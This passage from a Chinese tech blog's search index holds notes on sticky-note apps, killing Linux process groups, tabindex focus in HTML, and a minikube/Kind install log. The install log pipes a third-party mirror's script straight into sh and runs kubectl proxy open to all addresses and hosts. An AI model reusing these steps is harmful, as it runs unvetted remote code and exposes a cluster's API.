href=\"#PNotes-PNotes-NET\" class=\"headerlink\" title=\"PNotes / PNotes.NET\"></a>PNotes / PNotes.NET</h1><ul>\n<li><a href=\"http://winapphelp.winnexus.com/2011/09/pnotes.html\" target=\"_blank\" rel=\"noopener\">ㄟ批幫幫忙: PNotes使用教學</a></li>\n<li><a href=\"https://www.azofreeware.com/2011/09/pnotes-80110.html\" target=\"_blank\" rel=\"noopener\">PNotes 9.3.0 免安裝中文版 - 桌面便利貼軟體 - 阿榮福利味 - 免費軟體下載</a></li>\n</ul>\n<p>有看到官網比較PNotes / PNotes.NET<br>好奇可以搭配Word/PDF功能<br>裝了.NET版本<br>這個功能真的很多，不過不太會用<br>我用內建虛擬桌面…竟然會跑開(不確定可以設定)<br>只是用中文介面文字模糊…<br>所以試用一下就不用了</p>\n<h1 id=\"ATnotes\"><a href=\"#ATnotes\" class=\"headerlink\" title=\"ATnotes\"></a>ATnotes</h1><ul>\n<li><a href=\"https://www.azofreeware.com/2006/11/atnotes-95.html\" target=\"_blank\" rel=\"noopener\">ATnotes 9.5 免安裝中文版 - 好用桌面便利貼 - 阿榮福利味 - 免費軟體下載</a></li>\n<li><a href=\"https://sofree.cc/atnotes/\" target=\"_blank\" rel=\"noopener\">ATnotes 免費輕巧的桌面便利貼 - 香腸炒魷魚</a></li>\n</ul>\n<p>這個還滿像我同學用的<br>介面一般，檔案最小<br>推薦只單純用便利貼工具的人用<br>不需要雜七雜八功能<br>推薦用這個</p>\n<h1 id=\"Stickies\"><a href=\"#Stickies\" class=\"headerlink\" title=\"Stickies\"></a>Stickies</h1><ul>\n<li><a href=\"https://www.azofreeware.com/2008/01/stickies-60c.html\" target=\"_blank\" rel=\"noopener\">Stickies 9.0e 免安裝中文版 - 桌面便利貼軟體 - 阿榮福利味 - 免費軟體下載</a></li>\n<li><a href=\"https://wuangus.cc/stickies8/\" target=\"_blank\" rel=\"noopener\">[免費下載]強大的 Stickies 多用途桌面便利貼 - Angus福利社</a></li>\n</ul>\n<p>這可能是目前看過介面最好看一個<br>檔案又不會太大<br>而且刪除預設會把先前的便利貼放到垃圾桶<br>這樣就不用怕誤刪的囧境</p>\n<p>ATnotes、Stickies內建win10切換不會消失在桌面</p>\n<p>話說還看到有網路功能…<br>但Google一下，好像有區域網路聊天功能<br><a href=\"http://blog.xuite.net/axian/blog/230222028-%E7%94%A8Stickies%E4%BE%BF%E5%88%A9%E8%B2%BC%E5%B9%AB%E6%82%A8%E8%A8%98%E4%BA%8B%E6%8F%90%E9%86%92%E9%82%84%E5%8F%AF%E4%BB%A5.....%E8%81%8A%E5%A4%A9\" target=\"_blank\" rel=\"noopener\">用Stickies便利貼幫您記事提醒還可以…..聊天 @ Xian的家 :: 隨意窩 Xuite日誌</a></p>\n<h1 id=\"結論\"><a href=\"#結論\" class=\"headerlink\" title=\"結論\"></a>結論</h1><p>以功能為主的推薦使用Stickies<br>單存想用用便利貼而已ATnotes</p>\n<h1 id=\"Dexpot-便利貼同步每個桌面方法\"><a href=\"#Dexpot-便利貼同步每個桌面方法\" class=\"headerlink\" title=\"Dexpot 便利貼同步每個桌面方法\"></a>Dexpot 便利貼同步每個桌面方法</h1><p>在Dexpot可以設定桌面規則<br>設定便利貼同步到每個視窗</p>\n<img src=\"/blog/2018/05/01/好用的便利貼軟體/dexpot1.png\">","categories":["實用工具"],"tags":["virtual desktop","desktop","dextop"]},{"title":"如何在 Linux 殺掉(kill)子程序","url":"/blog/2019/10/03/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/","content":"<p>最近有排程卡住<br>MIS 殺掉(kill)程式，發現他的子程序還在跑<br>我們都以為 kill 掉父程序就可以關掉子程序<br>今天實驗出來是不能的</p>\n<p>2021 沒想到這篇 Google 還滿容易搜尋到<br>當初只是操作筆記，簡單紀錄<br>不過有部分寫錯，把多餘錯誤份刪掉<br>留下重點…避免其他人吸收錯誤知識</p>\n<a id=\"more\"></a>\n<h2 id=\"什麼是子程序\"><a href=\"#什麼是子程序\" class=\"headerlink\" title=\"什麼是子程序\"></a>什麼是子程序</h2><p>可以先去鳥哥那邊了解子程序運作原理<br>簡單說目前看到有兩種</p>\n<ol>\n<li><p>父程序呼叫子程序，父程序會掛起(類似stop)，不會做任何動作，等子程序跑完才會往下執行<br>PS: 剛好最近了解阻塞跟非阻塞，這應該就是<code>阻塞</code></p>\n</li>\n<li><p>fork and exec：程序呼叫的流程(可參考:<a href=\"http://linux.vbird.org/linux_basic/0440processcontrol.php\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十六章、程序管理與 SELinux 初探</a>，我目前還沒深入研究)</p>\n</li>\n</ol>\n<h2 id=\"kill-父程序實驗\"><a href=\"#kill-父程序實驗\" class=\"headerlink\" title=\"kill 父程序實驗\"></a>kill 父程序實驗</h2><p><strong>只要在 kill -$PGID</strong><br><strong>只要在 kill -$PGID</strong><br><strong>只要在 kill -$PGID</strong></p>\n<p><code>kill -$PID</code><br>其實下面我之前引用英文文章有寫到</p>\n<p>這邊我之前測試，使用 Ctrl + C 想說就是 <code>kill -2 xxx</code><br>但我阿現實作跟 kill 有差異`，我測試結果子程序會刪除<br>這邊就不深入探討了…<br><a href=\"https://segmentfault.com/a/1190000018369650\" target=\"_blank\" rel=\"noopener\">Linux ctrl-c explained(ctrl-c 详解) - SegmentFault 思否</a></p>\n<p><strong>2019-10-05</strong><br>原來我誤會了<br>其實 kill 也能殺掉<code>子程序</code><br>在研究 timeout 指令，實驗子程序狀況發現子程序也會關掉<br>這又是另外一個事情了</p>\n<p>推薦使用下面第二點方法去 kill 掉<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下面兩個寫法一樣</span></span><br><span class=\"line\"><span class=\"comment\"># 另外 $PGID 可解讀就是父層可以被 PID</span></span><br><span class=\"line\"><span class=\"built_in\">kill</span> -- -<span class=\"variable\">$PGID</span></span><br><span class=\"line\"><span class=\"built_in\">kill</span> -15 -<span class=\"variable\">$PGID</span></span><br><span class=\"line\"><span class=\"comment\"># 當然也可以強制關閉</span></span><br><span class=\"line\"><span class=\"built_in\">kill</span> -9 -<span class=\"variable\">$PGID</span></span><br></pre></td></tr></table></figure></p>\n<p>PGID 也可以用 ps 指令去查<br><a href=\"https://unix.stackexchange.com/questions/82724/ps-switches-to-display-pid-ppid-pgid-and-sid-collectively\" target=\"_blank\" rel=\"noopener\">process - ps switches to display PID, PPID, PGID, and SID collectively - Unix &amp; Linux Stack Exchange</a></p>\n<p><strong>2020-11-26</strong><br>最近用碰觸 kill<br>忘記一般 kill 要加負號才能刪掉子程序</p>\n<p>最近也在探討 nohup 和 &amp; 也能不能做尋組刪除<br>答案是可以的</p>\n<p>可以參考: <a href=\"https://juejin.cn/post/6844903927989665806?utm_campaign=devtool.com&amp;utm_medium=devtool.com&amp;utm_medium=devtool.com&amp;utm_source=devtool.com%3Futm_campaign%3Ddevtool.com&amp;utm_source=devtool.com\" target=\"_blank\" rel=\"noopener\">[譯] 如何殺死一個進程和它的所有子進程</a> <a href=\"/blog/2019/10/03/如何在-Linux-殺掉-kill-子程序/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>最近想做一個守護進程…<br>再研究…</p>\n<p>參考連結:</p>\n<blockquote>\n<p>1.kill a group of processes with negative PID(Process ID)</p>\n<p>kill  -TERM -PID</p>\n<p>Is to kill PID and all its child processes.</p>\n<ol start=\"2\">\n<li>kill a group of processes with their PGID(Process Group ID)</li>\n</ol>\n<p>kill – -$PGID   Kill using the default signal (TERM = 15)<br>kill -9 -$PGID   Kill using the KILL signal (9)</p>\n<ol start=\"3\">\n<li>kill a group processes with only PID info</li>\n</ol>\n<p>kill – -$(ps -o pgid= $PID | grep -o [0-9]*)</p>\n<p>Actually, you may notice that it’s just the way from #2<br>4.Using pkill, kill processes by PGID(Proess Group ID)</p>\n<p>pkill -9 -g $PGID</p>\n<p>5.Using pkill, kill processes by GID(Group ID)</p>\n<p>pkill -9 -G $GID</p>\n<p>6.Using pkill, kill processes by PPID(Parent Process ID)</p>\n<p>pkill -9 -p $PPID</p>\n<p>7.Using pkill, kill processes by terminal</p>\n<p>pkill -9 -t $terminal</p>\n<p>Note: without /dev/ prefix<br>8.Using pkill, kill processes by process name</p>\n<p>pkill -9 -x $process_name</p>\n<p>9.Using pkill, kill processes by session</p>\n<p>pkill -9 -s $sess</p>\n<p>How to get PID,PGID,sessionid etc?<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; # ps -o pid,ppid,pgid,gid,sess,cmd -U root</span><br><span class=\"line\">&gt;   PID  PPID  PGID   GID  SESS CMD</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<ul>\n<li><a href=\"http://fibrevillage.com/sysadmin/237-ways-to-kill-parent-and-child-processes-in-one-command\" target=\"_blank\" rel=\"noopener\">Ways to kill parent and child processes in one command - Fibrevillage</a></li>\n<li><a href=\"http://linux.vbird.org/linux_basic/0440processcontrol.php#ps\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十六章、程序管理與 SELinux 初探</a></li>\n<li><a href=\"https://www.wikitechy.com/tutorials/linux/best-way-to-kill-all-child-processes-in-linux\" target=\"_blank\" rel=\"noopener\">linux - Best way to kill the all child processes in Linux - By Microsoft Award MVP - ubuntu - red hat - debian - linux server - linux pc - Learn in 30sec | wikitechy</a></li>\n<li><a href=\"https://blog.csdn.net/qq_33160790/article/details/81346663\" target=\"_blank\" rel=\"noopener\">（三）进程各种id：pid、pgid、sid、全局pid、局部pid - win9 - CSDN博客</a></li>\n<li><a href=\"http://www.polish.url.tw/ach8/ach8.html#pgid\" target=\"_blank\" rel=\"noopener\">阿旺的 Linux 開竅手冊-process 進程(行程/程序)</a></li>\n<li><a href=\"https://unix.stackexchange.com/questions/124127/kill-all-descendant-processes\" target=\"_blank\" rel=\"noopener\">process - Kill all descendant processes - Unix &amp; Linux Stack Exchange</a></li>\n<li><a href=\"http://www.polish.url.tw/ach8/ach8.html#kill\" target=\"_blank\" rel=\"noopener\">阿旺的 Linux 開竅手冊-process 進程(行程/程序)</a></li>\n<li><a href=\"https://blog.csdn.net/hengyunabc/article/details/5921749\" target=\"_blank\" rel=\"noopener\">子进程及时知道父进程已经退出的最简单方案 - 横云断岭的专栏 - CSDN博客</a></li>\n</ul>\n","categories":["Linux"],"tags":["kill","pkill"]},{"title":"如何讓div有focus動作(tabindex)","url":"/blog/2019/02/27/%E5%A6%82%E4%BD%95%E8%AE%93div%E6%9C%89focus%E5%8B%95%E4%BD%9C-tabindex/","content":"<p>正常 focus 只有 input,textarea,button 等等<br>平常 div 是沒有 focus，但最近看<code>focus-within</code>有一個案例<br><a href=\"http://web.jobbole.com/95025/\" target=\"_blank\" rel=\"noopener\">神奇的选择器 :focus-within - WEB 前端 - 伯乐在线</a><br><a href=\"https://codepen.io/dannievinther/pen/NvZjvz\" target=\"_blank\" rel=\"noopener\">Off-screen nav with :focus-within [PURE CSS]</a><br>查了一下是 tabindex 關係<br>由於這個很少用，所以還是記錄一下。</p>\n<a id=\"more\"></a>\n<p><a href=\"http://bubkoo.com/2015/02/01/using-the-tabindex-attribute/\" target=\"_blank\" rel=\"noopener\">说说 tabindex 的那些事儿 | bubkoo</a> <a href=\"/blog/2019/02/27/如何讓div有focus動作-tabindex/web.png\" title=\"備份圖\">備份圖</a></p>\n<blockquote>\n<p>定義和用法<br>tabindex 屬性規定元素的 tab 鍵控制次序（當 tab 鍵用於導航時）。<br>提示和註釋<br>註釋：以下元素支持 tabindex 屬性：<code>&lt;a&gt;, &lt;area&gt;, &lt;button&gt;, &lt;input&gt;, &lt;object&gt;, &lt;select&gt; 以及 &lt;textarea&gt;</code>。</p>\n</blockquote>\n<p><a href=\"http://www.w3school.com.cn/tags/att_standard_tabindex.asp\" target=\"_blank\" rel=\"noopener\">HTML tabindex 属性</a><br><a href=\"https://www.douban.com/note/238463483/\" target=\"_blank\" rel=\"noopener\">(译)如何让 div 可以有 focus 事件?</a><br>div 或 span 設定 tabindex 就會有 focus</p>\n<p>最後剛好最近在查有沒有按鍵盤切換方向鍵移動不同 table 的 input<br>剛好有看到<br><a href=\"https://github.com/garygreen/arrow-table\" target=\"_blank\" rel=\"noopener\">garygreen/arrow-table: Navigate HTML tables with arrow keys (jQuery plugin)</a><br><a href=\"https://blog.darkthread.net/blog/jquery-arrow-keys-focus-moving\" target=\"_blank\" rel=\"noopener\">jQuery-利用上下左右鍵移動輸入焦點-黑暗執行緒</a><br>由於是上面是用 tabindex 去實作</p>\n<p>真想把他改成文字用左再調整更換 input 位置<br><a href=\"https://www.cnblogs.com/perseverancevictory/p/3665814.html\" target=\"_blank\" rel=\"noopener\">javascript 对象之 selectionStart selectionEnd - 选择了就坚持 - 博客园</a><br><a href=\"https://www.vishalon.net/blog/javascript-getting-and-setting-caret-position-in-textarea\" target=\"_blank\" rel=\"noopener\">Cross browser Javascript code to get/set caret position in textarea/input</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCaretPosition</span>(<span class=\"params\">ctrl</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// IE &lt; 9 Support</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.selection) &#123;</span><br><span class=\"line\">    ctrl.focus();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> range = <span class=\"built_in\">document</span>.selection.createRange();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> rangelen = range.text.length;</span><br><span class=\"line\">    range.moveStart(<span class=\"string\">\"character\"</span>, -ctrl.value.length);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> start = range.text.length - rangelen;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123; <span class=\"attr\">start</span>: start, <span class=\"attr\">end</span>: start + rangelen &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// IE &gt;=9 and other browsers</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ctrl.selectionStart || ctrl.selectionStart == <span class=\"string\">\"0\"</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123; <span class=\"attr\">start</span>: ctrl.selectionStart, <span class=\"attr\">end</span>: ctrl.selectionEnd &#125;;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123; <span class=\"attr\">start</span>: <span class=\"number\">0</span>, <span class=\"attr\">end</span>: <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setCaretPosition</span>(<span class=\"params\">ctrl, start, end</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// IE &gt;= 9 and other browsers</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ctrl.setSelectionRange) &#123;</span><br><span class=\"line\">    ctrl.focus();</span><br><span class=\"line\">    ctrl.setSelectionRange(start, end);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// IE &lt; 9</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ctrl.createTextRange) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> range = ctrl.createTextRange();</span><br><span class=\"line\">    range.collapse(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    range.moveEnd(<span class=\"string\">\"character\"</span>, end);</span><br><span class=\"line\">    range.moveStart(<span class=\"string\">\"character\"</span>, start);</span><br><span class=\"line\">    range.select();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先留著…以後再修改</p>\n","categories":["HTML"],"tags":["html","tabindex"]},{"title":"安裝 Kubernetes 記錄","url":"/blog/2021/01/14/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/","content":"<h2 id=\"minkube\"><a href=\"#minkube\" class=\"headerlink\" title=\"minkube\"></a>minkube</h2><h3 id=\"安裝-minikube\"><a href=\"#安裝-minikube\" class=\"headerlink\" title=\"安裝 minikube\"></a>安裝 minikube</h3><p>必備安裝</p>\n<ul>\n<li>VirtualBox</li>\n<li>minikube</li>\n<li>kubectl</li>\n</ul>\n<h4 id=\"Minikube\"><a href=\"#Minikube\" class=\"headerlink\" title=\"Minikube\"></a>Minikube</h4><p><a href=\"https://github.com/kubernetes/minikube/releases\" target=\"_blank\" rel=\"noopener\">(這邊請去官網看OS載點替換) kubernetes/minikube</a></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -LO https://github.com/kubernetes/minikube/releases/download/v1.6.2/minikube-linux-amd64(這邊請去官網看OS載點替換)</span><br><span class=\"line\">chmod +x minikube-linux-amd64</span><br><span class=\"line\">./minikube-linux-amd64 <span class=\"comment\"># 測試看能不跑</span></span><br><span class=\"line\">sudo mv minikube-linux-amd64 /usr/<span class=\"built_in\">local</span>/bin/minikube</span><br></pre></td></tr></table></figure>\n<h4 id=\"Virtualbox\"><a href=\"#Virtualbox\" class=\"headerlink\" title=\"Virtualbox\"></a>Virtualbox</h4><p><a href=\"https://www.virtualbox.org/wiki/Linux_Downloads\" target=\"_blank\" rel=\"noopener\">Linux_Downloads – Oracle VM VirtualBox</a></p>\n<p>我這邊是用 ElementaryOS (Ubuntu 18.04)<br>下載完成用 <code>sudo apt install ./xxx.deb</code> 指令安裝</p>\n<h4 id=\"kubectl\"><a href=\"#kubectl\" class=\"headerlink\" title=\"kubectl\"></a>kubectl</h4><p>單節點</p>\n<p><a href=\"https://kubernetes.io/docs/tasks/tools/install-kubectl/\" target=\"_blank\" rel=\"noopener\"> (這邊請去官網看OS載點替換) Install and Set Up kubectl - Kubernetes</a></p>\n<p>這邊我選 Linux<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl (這邊請去官網看OS載點替換)</span><br><span class=\"line\">chmod +x ./kubectl</span><br><span class=\"line\">sudo mv ./kubectl /usr/<span class=\"built_in\">local</span>/bin/kubectl</span><br><span class=\"line\">kubectl <span class=\"comment\"># 看能不能跑</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"minikube-start\"><a href=\"#minikube-start\" class=\"headerlink\" title=\"minikube start\"></a>minikube start</h4><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">minikube start</span><br><span class=\"line\"><span class=\"comment\"># 會安裝會用到的 iso</span></span><br><span class=\"line\">😄  minikube v1.6.2 on Debian buster/sid</span><br><span class=\"line\">✨  Automatically selected the <span class=\"string\">'virtualbox'</span> driver (alternates: [none])</span><br><span class=\"line\">🔥  Creating virtualbox VM (CPUs=2, Memory=2000MB, Disk=20000MB) ...</span><br><span class=\"line\">🐳  Preparing Kubernetes v1.17.0 on Docker <span class=\"string\">'19.03.5'</span> ...</span><br><span class=\"line\">🚜  Pulling images ...</span><br><span class=\"line\">🚀  Launching Kubernetes ... </span><br><span class=\"line\">⌛  Waiting <span class=\"keyword\">for</span> cluster to come online ...</span><br><span class=\"line\">🏄  Done! kubectl is now configured to use <span class=\"string\">\"minikube\"</span></span><br></pre></td></tr></table></figure>\n<p>最後可以下<code>minikube dashboard</code><br>看有沒有問題</p>\n<h3 id=\"遇到錯誤\"><a href=\"#遇到錯誤\" class=\"headerlink\" title=\"遇到錯誤\"></a>遇到錯誤</h3><h4 id=\"VM-64-bit-不能安裝-64-bit-OS\"><a href=\"#VM-64-bit-不能安裝-64-bit-OS\" class=\"headerlink\" title=\"VM 64 bit 不能安裝 64 bit OS\"></a>VM 64 bit 不能安裝 64 bit OS</h4><p><strong>先說結論:不能用 VM 跑樣子</strong></p>\n<p>用 VM 裝可能遇到的問題<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">💣  Unable to start VM. Please investigate and run &apos;minikube delete&apos; if possible</span><br><span class=\"line\">❌  Error: [VBOX_VTX_DISABLED] create: precreate: This computer doesn&apos;t have VT-X/AMD-v enabled. Enabling it in the BIOS is mandatory</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">config.vm.provider :virtualbox do |vb|  </span><br><span class=\"line\">  vb.customize [&quot;modifyvm&quot;, :id, &quot;--hwvirtex&quot;, &quot;off&quot;]     </span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n<p>參考來源: <a href=\"https://gist.github.com/betweenbrain/7798873\" target=\"_blank\" rel=\"noopener\">Disable VT-X in Vagrantfile</a><br>但最後還是不行</p>\n<blockquote>\n<p>Consequences from missing VT-X in nested VirtualBox</p>\n<p>There are currently two consequences from nesting without VT-X:</p>\n<pre><code>You cannot use multiple CPUs but you can use a single virtual cpu using vb.cpus = 1\nYou cannot run a 64-Bit VM within a nested VirtualBox.\n</code></pre></blockquote>\n<p><a href=\"https://stackoverflow.com/questions/24620599/error-vt-x-not-available-for-vagrant-machine-inside-virtualbox\" target=\"_blank\" rel=\"noopener\">Error VT-x not available for Vagrant machine inside Virtualbox - Stack Overflow</a></p>\n<h4 id=\"Exec-format-error\"><a href=\"#Exec-format-error\" class=\"headerlink\" title=\"Exec format error\"></a>Exec format error</h4><p>若有這個錯誤訊息…</p>\n<blockquote>\n<p>bash: /usr/local/bin/kubectl: cannot execute binary file: Exec format error</p>\n</blockquote>\n<p>就是安裝錯版本</p>\n<h3 id=\"查看-cluster-info-資訊\"><a href=\"#查看-cluster-info-資訊\" class=\"headerlink\" title=\"查看 cluster-info 資訊\"></a>查看 cluster-info 資訊</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl cluster-info</span><br><span class=\"line\">Kubernetes control plane is running at https://192.168.99.100:8443</span><br><span class=\"line\">KubeDNS is running at https://192.168.99.100:8443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy</span><br></pre></td></tr></table></figure>\n<p>成功完成</p>\n<h3 id=\"刪除-minikube\"><a href=\"#刪除-minikube\" class=\"headerlink\" title=\"刪除 minikube\"></a>刪除 minikube</h3><p>Delete minikube</p>\n<p>minikube delete &amp;&amp; rm -rf ~/.minikube</p>\n<h3 id=\"遠端連-dashboard\"><a href=\"#遠端連-dashboard\" class=\"headerlink\" title=\"遠端連 dashboard\"></a>遠端連 dashboard</h3><h4 id=\"安裝-UI\"><a href=\"#安裝-UI\" class=\"headerlink\" title=\"安裝 UI\"></a>安裝 UI</h4><p>以下參考:<br><a href=\"https://github.com/kubernetes/dashboard\" target=\"_blank\" rel=\"noopener\">kubernetes/dashboard: General-purpose web UI for Kubernetes clusters</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10195385\" target=\"_blank\" rel=\"noopener\">[Day 14] Kubernetes Dashboard 介紹 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.1.0/aio/deploy/recommended.yaml</span><br><span class=\"line\"></span><br><span class=\"line\">namespace/kubernetes-dashboard configured</span><br><span class=\"line\">serviceaccount/kubernetes-dashboard configured</span><br><span class=\"line\">service/kubernetes-dashboard configured</span><br><span class=\"line\">secret/kubernetes-dashboard-certs configured</span><br><span class=\"line\">secret/kubernetes-dashboard-csrf configured</span><br><span class=\"line\">secret/kubernetes-dashboard-key-holder configured</span><br><span class=\"line\">configmap/kubernetes-dashboard-settings configured</span><br><span class=\"line\">role.rbac.authorization.k8s.io/kubernetes-dashboard configured</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/kubernetes-dashboard configured</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/kubernetes-dashboard configured</span><br><span class=\"line\">deployment.apps/kubernetes-dashboard configured</span><br><span class=\"line\">service/dashboard-metrics-scraper configured</span><br><span class=\"line\">deployment.apps/dashboard-metrics-scraper configured</span><br><span class=\"line\"><span class=\"comment\"># 會遇到這個錯誤</span></span><br><span class=\"line\">The ClusterRoleBinding <span class=\"string\">\"kubernetes-dashboard\"</span> is invalid: roleRef: Invalid value: rbac.RoleRef&#123;APIGroup:<span class=\"string\">\"rbac.authorization.k8s.io\"</span>, Kind:<span class=\"string\">\"ClusterRole\"</span>, Name:<span class=\"string\">\"kubernetes-dashboard\"</span>&#125;: cannot change roleRef</span><br></pre></td></tr></table></figure>\n<p>這個錯誤，我目前無解…<br>因為刪除 kubernetes-dashboard 後會馬上跳出來</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ kubectl proxy</span><br><span class=\"line\"><span class=\"comment\"># 預設 localhost</span></span><br><span class=\"line\"><span class=\"comment\"># Starting to serve on 127.0.0.1:8001</span></span><br><span class=\"line\">kubectl proxy --address=<span class=\"string\">'0.0.0.0'</span> --port=8002 --accept-hosts=<span class=\"string\">'^*$'</span></span><br><span class=\"line\"><span class=\"comment\"># 開啟遠端連線</span></span><br></pre></td></tr></table></figure>\n<p>其他資源:<a href=\"https://www.cnblogs.com/rainingnight/p/deploying-k8s-dashboard-ui.html\" target=\"_blank\" rel=\"noopener\">kubernetes-dashboard(1.8.3)部署与踩坑 - 雨夜朦胧 - 博客园</a></p>\n<h3 id=\"簡單-Hello-World\"><a href=\"#簡單-Hello-World\" class=\"headerlink\" title=\"簡單 Hello World\"></a>簡單 Hello World</h3><p><a href=\"https://kubernetes.io/docs/tutorials/hello-minikube/\" target=\"_blank\" rel=\"noopener\">Hello Minikube | Kubernetes</a></p>\n<h2 id=\"Kind\"><a href=\"#Kind\" class=\"headerlink\" title=\"Kind\"></a>Kind</h2><h3 id=\"安裝-Docker\"><a href=\"#安裝-Docker\" class=\"headerlink\" title=\"安裝 Docker\"></a>安裝 Docker</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure>\n<p>詳細建議官網看新教學</p>\n<h4 id=\"設定-docker-權限\"><a href=\"#設定-docker-權限\" class=\"headerlink\" title=\"設定 docker 權限\"></a>設定 docker 權限</h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo usermod -G docker -a testuser</span><br></pre></td></tr></table></figure>\n<p>做完重新登錄</p>\n<h3 id=\"安裝-Kind\"><a href=\"#安裝-Kind\" class=\"headerlink\" title=\"安裝 Kind\"></a>安裝 Kind</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.9.0/kind-linux-amd64</span><br><span class=\"line\">chmod +x ./kind</span><br><span class=\"line\">mv ./kind /usr/local/bin/kind</span><br></pre></td></tr></table></figure>\n<h3 id=\"啟用集群\"><a href=\"#啟用集群\" class=\"headerlink\" title=\"啟用集群\"></a>啟用集群</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kind create cluster</span><br></pre></td></tr></table></figure>\n<h3 id=\"刪除集群\"><a href=\"#刪除集群\" class=\"headerlink\" title=\"刪除集群\"></a>刪除集群</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kind delete cluster</span><br></pre></td></tr></table></figure>\n<p>這邊要注意一點<br>移除集群預設選擇設定會拿掉<br>所以要重新選擇 k8s config context</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看現有選擇 k8s 環境</span></span><br><span class=\"line\">kubectl config current-context</span><br><span class=\"line\"><span class=\"comment\"># 列出所有環境</span></span><br><span class=\"line\">kubectl config get-contexts</span><br><span class=\"line\"><span class=\"comment\"># 選擇 k8s 環境</span></span><br><span class=\"line\">kubectl config use-context minikube</span><br></pre></td></tr></table></figure>\n<p>更多詳細設定請參考<a href=\"https://ithelp.ithome.com.tw/articles/10193502\" target=\"_blank\" rel=\"noopener\">Day 8 - 與 k8s 溝通: kubectl - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br>外來可能會針對設定檔做設定</p>\n<p>這樣兩個環境就建置出來</p>\n<p>相關教學:<br><a href=\"https://kind.sigs.k8s.io/docs/user/quick-start\" target=\"_blank\" rel=\"noopener\">kind – Quick Start</a> </p>\n<p><a href=\"https://www.cnblogs.com/weihanli/p/12831225.html\" target=\"_blank\" rel=\"noopener\">使用 kind 快速搭建 kubernetes 环境 - WeihanLi - 博客园</a><br><a href=\"https://www.hi-linux.com/posts/42332.html\" target=\"_blank\" rel=\"noopener\">使用 Kind 在 5 分钟内快速部署一个 Kubernetes 高可用集群 - 奇妙的 Linux 世界</a><br><a href=\"https://juejin.cn/post/6844903991499833358\" target=\"_blank\" rel=\"noopener\">快速搭建kubernetes与kubeSphere环境（亲测有效）</a></p>\n<p><a href=\"http://jiagoushi.pro/minikube-vs-kind-vs-k3s-what-should-i-use\" target=\"_blank\" rel=\"noopener\">【容器架构】Minikube vs.kind vs.k3s-我应该用哪一个？ | 架构师智库</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/117558052\" target=\"_blank\" rel=\"noopener\">不同Kubernetes构建工具的介绍 - 